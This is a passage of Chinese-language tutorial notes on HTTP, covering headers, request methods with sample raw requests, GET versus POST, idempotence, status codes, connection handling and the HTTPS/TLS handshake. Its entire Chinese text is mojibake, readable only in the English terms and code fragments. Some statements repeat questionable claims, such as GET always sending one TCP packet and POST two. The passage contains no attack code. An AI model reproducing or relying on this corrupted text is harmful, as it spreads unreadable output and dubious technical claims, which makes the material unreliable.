æ–¹ä¾¿ã€‚æ³¨æ„Refreshçš„æ„ä¹‰æ˜¯â€œNç§’ä¹‹åŽåˆ·æ–°æœ¬é¡µé¢æˆ–è®¿é—®æŒ‡å®šé¡µé¢â€ï¼Œè€Œä¸æ˜¯â€œæ¯éš”Nç§’åˆ·æ–°æœ¬é¡µé¢æˆ–è®¿é—®æŒ‡å®šé¡µé¢â€ã€‚å› æ­¤ï¼Œè¿žç»­åˆ·æ–°è¦æ±‚æ¯æ¬¡éƒ½å‘é€ä¸€ä¸ªRefreshå¤´ï¼Œè€Œå‘é€204çŠ¶æ€ä»£ç åˆ™å¯ä»¥é˜»æ­¢æµè§ˆå™¨ç»§ç»­åˆ·æ–°ï¼Œä¸ç®¡æ˜¯ä½¿ç”¨Refreshå¤´è¿˜æ˜¯ã€‚æ³¨æ„Refreshå¤´ä¸å±žäºŽHTTP 1.1æ­£å¼è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯ä¸€ä¸ªæ‰©å±•ï¼Œä½†Netscapeå’ŒIEéƒ½æ”¯æŒå®ƒã€‚ Server æœåŠ¡å™¨åå­—ã€‚Servletä¸€èˆ¬ä¸è®¾ç½®è¿™ä¸ªå€¼ï¼Œè€Œæ˜¯ç”±WebæœåŠ¡å™¨è‡ªå·±è®¾ç½®ã€‚ Set-Cookie è®¾ç½®å’Œé¡µé¢å…³è”çš„Cookieã€‚ WWW-Authenticate å®¢æˆ·åº”è¯¥åœ¨Authorizationå¤´ä¸­æä¾›ä»€ä¹ˆç±»åž‹çš„æŽˆæƒä¿¡æ¯ï¼Ÿåœ¨åŒ…å«401ï¼ˆUnauthorizedï¼‰çŠ¶æ€è¡Œçš„åº”ç­”ä¸­è¿™ä¸ªå¤´æ˜¯å¿…éœ€çš„ã€‚ä¾‹å¦‚ï¼Œresponse.setHeader(â€œWWW-Authenticateâ€, â€œBASIC realm=\â€executives\â€â€)ã€‚æ³¨æ„Servletä¸€èˆ¬ä¸è¿›è¡Œè¿™æ–¹é¢çš„å¤„ç†ï¼Œè€Œæ˜¯è®©WebæœåŠ¡å™¨çš„ä¸“é—¨æœºåˆ¶æ¥æŽ§åˆ¶å—å¯†ç ä¿æŠ¤é¡µé¢çš„è®¿é—®ï¼ˆä¾‹å¦‚.htaccessï¼‰ã€‚ äºŒã€HTTP æ–¹æ³•å®¢æˆ·ç«¯å‘é€çš„ è¯·æ±‚æŠ¥æ–‡ ç¬¬ä¸€è¡Œä¸ºè¯·æ±‚è¡Œï¼ŒåŒ…å«äº†æ–¹æ³•å­—æ®µã€‚ GET èŽ·å–èµ„æº å½“å‰ç½‘ç»œè¯·æ±‚ä¸­ï¼Œç»å¤§éƒ¨åˆ†ä½¿ç”¨çš„æ˜¯ GET æ–¹æ³•ã€‚ HEAD èŽ·å–æŠ¥æ–‡é¦–éƒ¨ å’Œ GET æ–¹æ³•ç±»ä¼¼ï¼Œä½†æ˜¯ä¸è¿”å›žæŠ¥æ–‡å®žä½“ä¸»ä½“éƒ¨åˆ†ã€‚ ä¸»è¦ç”¨äºŽç¡®è®¤ URL çš„æœ‰æ•ˆæ€§ä»¥åŠèµ„æºæ›´æ–°çš„æ—¥æœŸæ—¶é—´ç­‰ã€‚ POST ä¼ è¾“å®žä½“ä¸»ä½“ POST ä¸»è¦ç”¨æ¥ä¼ è¾“æ•°æ®ï¼Œè€Œ GET ä¸»è¦ç”¨æ¥èŽ·å–èµ„æºã€‚ æ›´å¤š POST ä¸Ž GET çš„æ¯”è¾ƒè¯·è§ç¬¬ä¹ç« ã€‚ GETäº§ç”Ÿä¸€ä¸ªTCPæ•°æ®åŒ…ï¼›POSTäº§ç”Ÿä¸¤ä¸ªTCPæ•°æ®åŒ…ã€‚ é•¿çš„è¯´ï¼š å¯¹äºŽGETæ–¹å¼çš„è¯·æ±‚ï¼Œæµè§ˆå™¨ä¼šæŠŠhttp headerå’Œdataä¸€å¹¶å‘é€å‡ºåŽ»ï¼ŒæœåŠ¡å™¨å“åº”200ï¼ˆè¿”å›žæ•°æ®ï¼‰ï¼› è€Œå¯¹äºŽPOSTï¼Œæµè§ˆå™¨å…ˆå‘é€headerï¼ŒæœåŠ¡å™¨å“åº”100 continueï¼Œæµè§ˆå™¨å†å‘é€dataï¼ŒæœåŠ¡å™¨å“åº”200 okï¼ˆè¿”å›žæ•°æ®ï¼‰ã€‚ GETåœ¨æµè§ˆå™¨å›žé€€æ—¶æ˜¯æ— å®³çš„ï¼Œè€ŒPOSTä¼šå†æ¬¡æäº¤è¯·æ±‚ã€‚ GETäº§ç”Ÿçš„URLåœ°å€å¯ä»¥è¢«Bookmarkï¼Œè€ŒPOSTä¸å¯ä»¥ã€‚ GETè¯·æ±‚ä¼šè¢«æµè§ˆå™¨ä¸»åŠ¨cacheï¼Œè€ŒPOSTä¸ä¼šï¼Œé™¤éžæ‰‹åŠ¨è®¾ç½®ã€‚ GETè¯·æ±‚åªèƒ½è¿›è¡Œurlç¼–ç ï¼Œè€ŒPOSTæ”¯æŒå¤šç§ç¼–ç æ–¹å¼ã€‚ GETè¯·æ±‚å‚æ•°ä¼šè¢«å®Œæ•´ä¿ç•™åœ¨æµè§ˆå™¨åŽ†å²è®°å½•é‡Œï¼Œè€ŒPOSTä¸­çš„å‚æ•°ä¸ä¼šè¢«ä¿ç•™ã€‚ GETè¯·æ±‚åœ¨URLä¸­ä¼ é€çš„å‚æ•°æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œè€ŒPOSTä¹ˆæœ‰ã€‚ å¯¹å‚æ•°çš„æ•°æ®ç±»åž‹ï¼ŒGETåªæŽ¥å—ASCIIå­—ç¬¦ï¼Œè€ŒPOSTæ²¡æœ‰é™åˆ¶ã€‚ GETæ¯”POSTæ›´ä¸å®‰å…¨ï¼Œå› ä¸ºå‚æ•°ç›´æŽ¥æš´éœ²åœ¨URLä¸Šï¼Œæ‰€ä»¥ä¸èƒ½ç”¨æ¥ä¼ é€’æ•æ„Ÿä¿¡æ¯ã€‚ GETå‚æ•°é€šè¿‡URLä¼ é€’ï¼ŒPOSTæ”¾åœ¨Request bodyä¸­ã€‚ PUT ä¸Šä¼ æ–‡ä»¶ ç”±äºŽè‡ªèº«ä¸å¸¦éªŒè¯æœºåˆ¶ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå› æ­¤å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œä¸€èˆ¬ä¸ä½¿ç”¨è¯¥æ–¹æ³•ã€‚ 123456PUT /new.html HTTP/1.1Host: example.comContent-type: text/htmlContent-length: 16&lt;p&gt;New File&lt;/p&gt; PATCH å¯¹èµ„æºè¿›è¡Œéƒ¨åˆ†ä¿®æ”¹ PUT ä¹Ÿå¯ä»¥ç”¨äºŽä¿®æ”¹èµ„æºï¼Œä½†æ˜¯åªèƒ½å®Œå…¨æ›¿ä»£åŽŸå§‹èµ„æºï¼ŒPATCH å…è®¸éƒ¨åˆ†ä¿®æ”¹ã€‚ 1234567PATCH /file.txt HTTP/1.1Host: www.example.comContent-Type: application/exampleIf-Match: &quot;e0023aa4e&quot;Content-Length: 100[description of changes] DELETE åˆ é™¤æ–‡ä»¶ ä¸Ž PUT åŠŸèƒ½ç›¸åï¼Œå¹¶ä¸”åŒæ ·ä¸å¸¦éªŒè¯æœºåˆ¶ã€‚ 1DELETE /file.html HTTP/1.1 OPTIONS æŸ¥è¯¢æ”¯æŒçš„æ–¹æ³• æŸ¥è¯¢æŒ‡å®šçš„ URL èƒ½å¤Ÿæ”¯æŒçš„æ–¹æ³•ã€‚ ä¼šè¿”å›ž Allow: GET, POST, HEAD, OPTIONS è¿™æ ·çš„å†…å®¹ã€‚ CONNECT è¦æ±‚åœ¨ä¸Žä»£ç†æœåŠ¡å™¨é€šä¿¡æ—¶å»ºç«‹éš§é“ ä½¿ç”¨ SSLï¼ˆSecure Sockets Layerï¼Œå®‰å…¨å¥—æŽ¥å±‚ï¼‰å’Œ TLSï¼ˆTransport Layer Securityï¼Œä¼ è¾“å±‚å®‰å…¨ï¼‰åè®®æŠŠé€šä¿¡å†…å®¹åŠ å¯†åŽç»ç½‘ç»œéš§é“ä¼ è¾“ã€‚ 1CONNECT www.example.com:443 HTTP/1.1 TRACE è¿½è¸ªè·¯å¾„ æœåŠ¡å™¨ä¼šå°†é€šä¿¡è·¯å¾„è¿”å›žç»™å®¢æˆ·ç«¯ã€‚ å‘é€è¯·æ±‚æ—¶ï¼Œåœ¨ Max-Forwards é¦–éƒ¨å­—æ®µä¸­å¡«å…¥æ•°å€¼ï¼Œæ¯ç»è¿‡ä¸€ä¸ªæœåŠ¡å™¨å°±ä¼šå‡ 1ï¼Œå½“æ•°å€¼ä¸º 0 æ—¶å°±åœæ­¢ä¼ è¾“ã€‚ é€šå¸¸ä¸ä¼šä½¿ç”¨ TRACEï¼Œå¹¶ä¸”å®ƒå®¹æ˜“å—åˆ° XST æ”»å‡»ï¼ˆCross-Site Tracingï¼Œè·¨ç«™è¿½è¸ªï¼‰ã€‚ GET å’Œ POST æ¯”è¾ƒä½œç”¨ GET ç”¨äºŽèŽ·å–èµ„æºï¼Œè€Œ POST ç”¨äºŽä¼ è¾“å®žä½“ä¸»ä½“ã€‚ å‚æ•° GET å’Œ POST çš„è¯·æ±‚éƒ½èƒ½ä½¿ç”¨é¢å¤–çš„å‚æ•°ï¼Œä½†æ˜¯ GET çš„å‚æ•°æ˜¯ä»¥æŸ¥è¯¢å­—ç¬¦ä¸²å‡ºçŽ°åœ¨ URL ä¸­ï¼Œè€Œ POST çš„å‚æ•°å­˜å‚¨åœ¨å®žä½“ä¸»ä½“ä¸­ã€‚ä¸èƒ½å› ä¸º POST å‚æ•°å­˜å‚¨åœ¨å®žä½“ä¸»ä½“ä¸­å°±è®¤ä¸ºå®ƒçš„å®‰å…¨æ€§æ›´é«˜ï¼Œå› ä¸ºç…§æ ·å¯ä»¥é€šè¿‡ä¸€äº›æŠ“åŒ…å·¥å…·ï¼ˆFiddlerï¼‰æŸ¥çœ‹ã€‚ å› ä¸º URL åªæ”¯æŒ ASCII ç ï¼Œå› æ­¤ GET çš„å‚æ•°ä¸­å¦‚æžœå­˜åœ¨ä¸­æ–‡ç­‰å­—ç¬¦å°±éœ€è¦å…ˆè¿›è¡Œç¼–ç ã€‚ä¾‹å¦‚ ä¸­æ–‡ ä¼šè½¬æ¢ä¸º %E4%B8%AD%E6%96%87ï¼Œè€Œç©ºæ ¼ä¼šè½¬æ¢ä¸º %20ã€‚POST å‚æ•°æ”¯æŒæ ‡å‡†å­—ç¬¦é›†ã€‚ 1234GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 å®‰å…¨ å®‰å…¨çš„ HTTP æ–¹æ³•ä¸ä¼šæ”¹å˜æœåŠ¡å™¨çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªæ˜¯å¯è¯»çš„ã€‚ GET æ–¹æ³•æ˜¯å®‰å…¨çš„ï¼Œè€Œ POST å´ä¸æ˜¯ï¼Œå› ä¸º POST çš„ç›®çš„æ˜¯ä¼ é€å®žä½“ä¸»ä½“å†…å®¹ï¼Œè¿™ä¸ªå†…å®¹å¯èƒ½æ˜¯ç”¨æˆ·ä¸Šä¼ çš„è¡¨å•æ•°æ®ï¼Œä¸Šä¼ æˆåŠŸä¹‹åŽï¼ŒæœåŠ¡å™¨å¯èƒ½æŠŠè¿™ä¸ªæ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œå› æ­¤çŠ¶æ€ä¹Ÿå°±å‘ç”Ÿäº†æ”¹å˜ã€‚ å®‰å…¨çš„æ–¹æ³•é™¤äº† GET ä¹‹å¤–è¿˜æœ‰ï¼šHEADã€OPTIONSã€‚ ä¸å®‰å…¨çš„æ–¹æ³•é™¤äº† POST ä¹‹å¤–è¿˜æœ‰ PUTã€DELETEã€‚ å¹‚ç­‰æ€§ å¹‚ç­‰çš„ HTTP æ–¹æ³•ï¼ŒåŒæ ·çš„è¯·æ±‚è¢«æ‰§è¡Œä¸€æ¬¡ä¸Žè¿žç»­æ‰§è¡Œå¤šæ¬¡çš„æ•ˆæžœæ˜¯ä¸€æ ·çš„ï¼ŒæœåŠ¡å™¨çš„çŠ¶æ€ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æ¢å¥è¯è¯´å°±æ˜¯ï¼Œå¹‚ç­‰æ–¹æ³•ä¸åº”è¯¥å…·æœ‰å‰¯ä½œç”¨ï¼ˆç»Ÿè®¡ç”¨é€”é™¤å¤–ï¼‰ã€‚ æ‰€æœ‰çš„å®‰å…¨æ–¹æ³•ä¹Ÿéƒ½æ˜¯å¹‚ç­‰çš„ã€‚ åœ¨æ­£ç¡®å®žçŽ°çš„æ¡ä»¶ä¸‹ï¼ŒGETï¼ŒHEADï¼ŒPUT å’Œ DELETE ç­‰æ–¹æ³•éƒ½æ˜¯å¹‚ç­‰çš„ï¼Œè€Œ POST æ–¹æ³•ä¸æ˜¯ã€‚ GET /pageX HTTP/1.1 æ˜¯å¹‚ç­‰çš„ï¼Œè¿žç»­è°ƒç”¨å¤šæ¬¡ï¼Œå®¢æˆ·ç«¯æŽ¥æ”¶åˆ°çš„ç»“æžœéƒ½æ˜¯ä¸€æ ·çš„ï¼š 1234GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 ä¸æ˜¯å¹‚ç­‰çš„ï¼Œå¦‚æžœè°ƒç”¨å¤šæ¬¡ï¼Œå°±ä¼šå¢žåŠ å¤šè¡Œè®°å½•ï¼š 123POST /add_row HTTP/1.1 -&gt; Adds a 1nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 æ˜¯å¹‚ç­‰çš„ï¼Œå³ä½¿ä¸åŒçš„è¯·æ±‚æŽ¥æ”¶åˆ°çš„çŠ¶æ€ç ä¸ä¸€æ ·ï¼š 123DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 å¯ç¼“å­˜ å¦‚æžœè¦å¯¹å“åº”è¿›è¡Œç¼“å­˜ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š è¯·æ±‚æŠ¥æ–‡çš„ HTTP æ–¹æ³•æœ¬èº«æ˜¯å¯ç¼“å­˜çš„ï¼ŒåŒ…æ‹¬ GET å’Œ HEADï¼Œä½†æ˜¯ PUT å’Œ DELETE ä¸å¯ç¼“å­˜ï¼ŒPOST åœ¨å¤šæ•°æƒ…å†µä¸‹ä¸å¯ç¼“å­˜çš„ã€‚ å“åº”æŠ¥æ–‡çš„çŠ¶æ€ç æ˜¯å¯ç¼“å­˜çš„ï¼ŒåŒ…æ‹¬ï¼š200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501ã€‚ å“åº”æŠ¥æ–‡çš„ Cache-Control é¦–éƒ¨å­—æ®µæ²¡æœ‰æŒ‡å®šä¸è¿›è¡Œç¼“å­˜ã€‚ XMLHttpRequest åœ¨ä½¿ç”¨ XMLHttpRequest çš„ POST æ–¹æ³•æ—¶ï¼Œæµè§ˆå™¨ä¼šå…ˆå‘é€ Header å†å‘é€ Dataã€‚ä½†å¹¶ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨ä¼šè¿™ä¹ˆåšï¼Œä¾‹å¦‚ç«ç‹å°±ä¸ä¼šã€‚ è€Œ GET æ–¹æ³• Header å’Œ Data ä¼šä¸€èµ·å‘é€ã€‚ ä¸‰ã€HTTP çŠ¶æ€ç æœåŠ¡å™¨è¿”å›žçš„ å“åº”æŠ¥æ–‡ ä¸­ç¬¬ä¸€è¡Œä¸ºçŠ¶æ€è¡Œï¼ŒåŒ…å«äº†çŠ¶æ€ç ä»¥åŠåŽŸå› çŸ­è¯­ï¼Œç”¨æ¥å‘ŠçŸ¥å®¢æˆ·ç«¯è¯·æ±‚çš„ç»“æžœã€‚ çŠ¶æ€ç  ç±»åˆ« å«ä¹‰ 1XX Informationalï¼ˆä¿¡æ¯æ€§çŠ¶æ€ç ï¼‰ æŽ¥æ”¶çš„è¯·æ±‚æ­£åœ¨å¤„ç† 2XX Successï¼ˆæˆåŠŸçŠ¶æ€ç ï¼‰ è¯·æ±‚æ­£å¸¸å¤„ç†å®Œæ¯• 3XX Redirectionï¼ˆé‡å®šå‘çŠ¶æ€ç ï¼‰ éœ€è¦è¿›è¡Œé™„åŠ æ“ä½œä»¥å®Œæˆè¯·æ±‚ 4XX Client Errorï¼ˆå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç ï¼‰ æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚ 5XX Server Errorï¼ˆæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç ï¼‰ æœåŠ¡å™¨å¤„ç†è¯·æ±‚å‡ºé”™ 1XX ä¿¡æ¯ 100 Continue ï¼šè¡¨æ˜Žåˆ°ç›®å‰ä¸ºæ­¢éƒ½å¾ˆæ­£å¸¸ï¼Œå®¢æˆ·ç«¯å¯ä»¥ç»§ç»­å‘é€è¯·æ±‚æˆ–è€…å¿½ç•¥è¿™ä¸ªå“åº”ã€‚ 2XX æˆåŠŸ 200 OK 204 No Content ï¼šè¯·æ±‚å·²ç»æˆåŠŸå¤„ç†ï¼Œä½†æ˜¯è¿”å›žçš„å“åº”æŠ¥æ–‡ä¸åŒ…å«å®žä½“çš„ä¸»ä½“éƒ¨åˆ†ã€‚ä¸€èˆ¬åœ¨åªéœ€è¦ä»Žå®¢æˆ·ç«¯å¾€æœåŠ¡å™¨å‘é€ä¿¡æ¯ï¼Œè€Œä¸éœ€è¦è¿”å›žæ•°æ®æ—¶ä½¿ç”¨ã€‚ 206 Partial Content ï¼šè¡¨ç¤ºå®¢æˆ·ç«¯è¿›è¡Œäº†èŒƒå›´è¯·æ±‚ï¼Œå“åº”æŠ¥æ–‡åŒ…å«ç”± Content-Range æŒ‡å®šèŒƒå›´çš„å®žä½“å†…å®¹ã€‚ 3XX é‡å®šå‘ 301 Moved Permanently ï¼šæ°¸ä¹…æ€§é‡å®šå‘ 302 Found ï¼šä¸´æ—¶æ€§é‡å®šå‘ 303 See Other ï¼šå’Œ 302 æœ‰ç€ç›¸åŒçš„åŠŸèƒ½ï¼Œä½†æ˜¯ 303 æ˜Žç¡®è¦æ±‚å®¢æˆ·ç«¯åº”è¯¥é‡‡ç”¨ GET æ–¹æ³•èŽ·å–èµ„æºã€‚ æ³¨ï¼šè™½ç„¶ HTTP åè®®è§„å®š 301ã€302 çŠ¶æ€ä¸‹é‡å®šå‘æ—¶ä¸å…è®¸æŠŠ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ï¼Œä½†æ˜¯å¤§å¤šæ•°æµè§ˆå™¨éƒ½ä¼šåœ¨ 301ã€302 å’Œ 303 çŠ¶æ€ä¸‹çš„é‡å®šå‘æŠŠ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ã€‚ 304 Not Modified ï¼šå¦‚æžœè¯·æ±‚æŠ¥æ–‡é¦–éƒ¨åŒ…å«ä¸€äº›æ¡ä»¶ï¼Œä¾‹å¦‚ï¼šIf-Matchï¼ŒIf-Modified-Sinceï¼ŒIf-None-Matchï¼ŒIf-Rangeï¼ŒIf-Unmodified-Sinceï¼Œå¦‚æžœä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™æœåŠ¡å™¨ä¼šè¿”å›ž 304 çŠ¶æ€ç ã€‚ 307 Temporary Redirect ï¼šä¸´æ—¶é‡å®šå‘ï¼Œä¸Ž 302 çš„å«ä¹‰ç±»ä¼¼ï¼Œä½†æ˜¯ 307 è¦æ±‚æµè§ˆå™¨ä¸ä¼šæŠŠé‡å®šå‘è¯·æ±‚çš„ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ã€‚ 4XX å®¢æˆ·ç«¯é”™è¯¯ 400 Bad Request ï¼šè¯·æ±‚æŠ¥æ–‡ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯ã€‚ 401 Unauthorized ï¼šè¯¥çŠ¶æ€ç è¡¨ç¤ºå‘é€çš„è¯·æ±‚éœ€è¦æœ‰è®¤è¯ä¿¡æ¯ï¼ˆBASIC è®¤è¯ã€DIGEST è®¤è¯ï¼‰ã€‚å¦‚æžœä¹‹å‰å·²è¿›è¡Œè¿‡ä¸€æ¬¡è¯·æ±‚ï¼Œåˆ™è¡¨ç¤ºç”¨æˆ·è®¤è¯å¤±è´¥ã€‚ 403 Forbidden ï¼šè¯·æ±‚è¢«æ‹’ç»ã€‚ 404 Not Found 5XX æœåŠ¡å™¨é”™è¯¯ 500 Internal Server Error ï¼šæœåŠ¡å™¨æ­£åœ¨æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿé”™è¯¯ã€‚ 503 Service Unavailable ï¼šæœåŠ¡å™¨æš‚æ—¶å¤„äºŽè¶…è´Ÿè½½æˆ–æ­£åœ¨è¿›è¡Œåœæœºç»´æŠ¤ï¼ŒçŽ°åœ¨æ— æ³•å¤„ç†è¯·æ±‚ã€‚ å››ã€å…·ä½“åº”ç”¨è¿žæŽ¥ç®¡ç† çŸ­è¿žæŽ¥ä¸Žé•¿è¿žæŽ¥ å½“æµè§ˆå™¨è®¿é—®ä¸€ä¸ªåŒ…å«å¤šå¼ å›¾ç‰‡çš„ HTML é¡µé¢æ—¶ï¼Œé™¤äº†è¯·æ±‚è®¿é—®çš„ HTML é¡µé¢èµ„æºï¼Œè¿˜ä¼šè¯·æ±‚å›¾ç‰‡èµ„æºã€‚å¦‚æžœæ¯è¿›è¡Œä¸€æ¬¡ HTTP é€šä¿¡å°±è¦æ–°å»ºä¸€ä¸ª TCP è¿žæŽ¥ï¼Œé‚£ä¹ˆå¼€é”€ä¼šå¾ˆå¤§ã€‚ é•¿è¿žæŽ¥åªéœ€è¦å»ºç«‹ä¸€æ¬¡ TCP è¿žæŽ¥å°±èƒ½è¿›è¡Œå¤šæ¬¡ HTTP é€šä¿¡ã€‚ ä»Ž HTTP/1.1 å¼€å§‹é»˜è®¤æ˜¯é•¿è¿žæŽ¥çš„ï¼Œå¦‚æžœè¦æ–­å¼€è¿žæŽ¥ï¼Œéœ€è¦ç”±å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡å™¨ç«¯æå‡ºæ–­å¼€ï¼Œä½¿ç”¨ Connection : closeï¼› åœ¨ HTTP/1.1 ä¹‹å‰é»˜è®¤æ˜¯çŸ­è¿žæŽ¥çš„ï¼Œå¦‚æžœéœ€è¦ä½¿ç”¨é•¿è¿žæŽ¥ï¼Œåˆ™ä½¿ç”¨ Connection : Keep-Aliveã€‚ æµæ°´çº¿ é»˜è®¤æƒ…å†µä¸‹ï¼ŒHTTP è¯·æ±‚æ˜¯æŒ‰é¡ºåºå‘å‡ºçš„ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚åªæœ‰åœ¨å½“å‰è¯·æ±‚æ”¶åˆ°å“åº”ä¹‹åŽæ‰ä¼šè¢«å‘å‡ºã€‚ç”±äºŽå—åˆ°ç½‘ç»œå»¶è¿Ÿå’Œå¸¦å®½çš„é™åˆ¶ï¼Œåœ¨ä¸‹ä¸€ä¸ªè¯·æ±‚è¢«å‘é€åˆ°æœåŠ¡å™¨ä¹‹å‰ï¼Œå¯èƒ½éœ€è¦ç­‰å¾…å¾ˆé•¿æ—¶é—´ã€‚ æµæ°´çº¿æ˜¯åœ¨åŒä¸€æ¡é•¿è¿žæŽ¥ä¸Šè¿žç»­å‘å‡ºè¯·æ±‚ï¼Œè€Œä¸ç”¨ç­‰å¾…å“åº”è¿”å›žï¼Œè¿™æ ·å¯ä»¥å‡å°‘å»¶è¿Ÿã€‚ äº”ã€HTTPSHTTP æœ‰ä»¥ä¸‹å®‰å…¨æ€§é—®é¢˜ï¼š ä½¿ç”¨æ˜Žæ–‡è¿›è¡Œé€šä¿¡ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬ï¼› ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½ï¼Œé€šä¿¡æ–¹çš„èº«ä»½æœ‰å¯èƒ½é­é‡ä¼ªè£…ï¼› æ— æ³•è¯æ˜ŽæŠ¥æ–‡çš„å®Œæ•´æ€§ï¼ŒæŠ¥æ–‡æœ‰å¯èƒ½é­ç¯¡æ”¹ã€‚ HTTPS å¹¶ä¸æ˜¯æ–°åè®®ï¼Œè€Œæ˜¯è®© HTTP å…ˆå’Œ SSLï¼ˆSecure Sockets Layerï¼‰é€šä¿¡ï¼Œå†ç”± SSL å’Œ TCP é€šä¿¡ï¼Œä¹Ÿå°±æ˜¯è¯´ HTTPS ä½¿ç”¨äº†éš§é“è¿›è¡Œé€šä¿¡ã€‚ é€šè¿‡ä½¿ç”¨ SSLï¼ŒHTTPS å…·æœ‰äº†åŠ å¯†ï¼ˆé˜²çªƒå¬ï¼‰ã€è®¤è¯ï¼ˆé˜²ä¼ªè£…ï¼‰å’Œå®Œæ•´æ€§ä¿æŠ¤ï¼ˆé˜²ç¯¡æ”¹ï¼‰ã€‚ éžå¯¹ç§°å¯†é’¥åŠ å¯† éžå¯¹ç§°å¯†é’¥åŠ å¯†ï¼Œåˆç§°å…¬å¼€å¯†é’¥åŠ å¯†ï¼ˆPublic-Key Encryptionï¼‰ï¼ŒåŠ å¯†å’Œè§£å¯†ä½¿ç”¨ä¸åŒçš„å¯†é’¥ã€‚ å…¬å¼€å¯†é’¥æ‰€æœ‰äººéƒ½å¯ä»¥èŽ·å¾—ï¼Œé€šä¿¡å‘é€æ–¹èŽ·å¾—æŽ¥æ”¶æ–¹çš„å…¬å¼€å¯†é’¥ä¹‹åŽï¼Œå°±å¯ä»¥ä½¿ç”¨å…¬å¼€å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼ŒæŽ¥æ”¶æ–¹æ”¶åˆ°é€šä¿¡å†…å®¹åŽä½¿ç”¨ç§æœ‰å¯†é’¥è§£å¯†ã€‚ éžå¯¹ç§°å¯†é’¥é™¤äº†ç”¨æ¥åŠ å¯†ï¼Œè¿˜å¯ä»¥ç”¨æ¥è¿›è¡Œç­¾åã€‚å› ä¸ºç§æœ‰å¯†é’¥æ— æ³•è¢«å…¶ä»–äººèŽ·å–ï¼Œå› æ­¤é€šä¿¡å‘é€æ–¹ä½¿ç”¨å…¶ç§æœ‰å¯†é’¥è¿›è¡Œç­¾åï¼Œé€šä¿¡æŽ¥æ”¶æ–¹ä½¿ç”¨å‘é€æ–¹çš„å…¬å¼€å¯†é’¥å¯¹ç­¾åè¿›è¡Œè§£å¯†ï¼Œå°±èƒ½åˆ¤æ–­è¿™ä¸ªç­¾åæ˜¯å¦æ­£ç¡®ã€‚ ä¼˜ç‚¹ï¼šå¯ä»¥æ›´å®‰å…¨åœ°å°†å…¬å¼€å¯†é’¥ä¼ è¾“ç»™é€šä¿¡å‘é€æ–¹ï¼› ç¼ºç‚¹ï¼šè¿ç®—é€Ÿåº¦æ…¢ã€‚ HTTPS é‡‡ç”¨çš„åŠ å¯†æ–¹å¼ HTTPS é‡‡ç”¨æ··åˆçš„åŠ å¯†æœºåˆ¶ï¼Œä½¿ç”¨éžå¯¹ç§°å¯†é’¥åŠ å¯†ç”¨äºŽä¼ è¾“å¯¹ç§°å¯†é’¥æ¥ä¿è¯ä¼ è¾“è¿‡ç¨‹çš„å®‰å…¨æ€§ï¼Œä¹‹åŽä½¿ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†è¿›è¡Œé€šä¿¡æ¥ä¿è¯é€šä¿¡è¿‡ç¨‹çš„æ•ˆçŽ‡ã€‚ï¼ˆä¸‹å›¾ä¸­çš„ Session Key å°±æ˜¯å¯¹ç§°å¯†é’¥ï¼‰ï¼Œè€ŒæœåŠ¡å™¨å…¬é’¥åªç”¨äºŽåŠ å¯†â€Session Key â€œæœ¬èº«ï¼Œè¿™æ ·å°±å‡å°‘äº†åŠ å¯†è¿ç®—çš„æ¶ˆè€—æ—¶é—´ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ•´ä¸ªSSL/TLSæ¡æ‰‹é˜¶æ®µä¸€å…±æœ‰4æ¬¡é€šä¿¡ï¼š 1.å®¢æˆ·ç«¯å‘å‡ºè¯·æ±‚ï¼ˆClientHelloï¼‰ï¼šéšæœºæ•°1ï¼Œæ”¯æŒçš„åè®®ï¼Œæ”¯æŒçš„åŠ å¯†æ–¹æ³• é¦–å…ˆï¼Œå®¢æˆ·ç«¯å…ˆå‘æœåŠ¡å™¨å‘å‡ºåŠ å¯†é€šä¿¡çš„è¯·æ±‚ï¼Œå¹¶å‘æœåŠ¡å™¨æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š æ”¯æŒçš„åè®®ç‰ˆæœ¬ï¼Œå¦‚TLS 1.0 ä¸€ä¸ªå®¢æˆ·ç«¯ç”Ÿæˆçš„éšæœºæ•°ï¼Œç¨åŽç”¨äºŽç”Ÿæˆå¯¹è¯å¯†é’¥ æ”¯æŒçš„åŠ å¯†æ–¹æ³•ï¼Œå¦‚RSAå…¬é’¥åŠ å¯† æ”¯æŒçš„åŽ‹ç¼©æ–¹æ³• 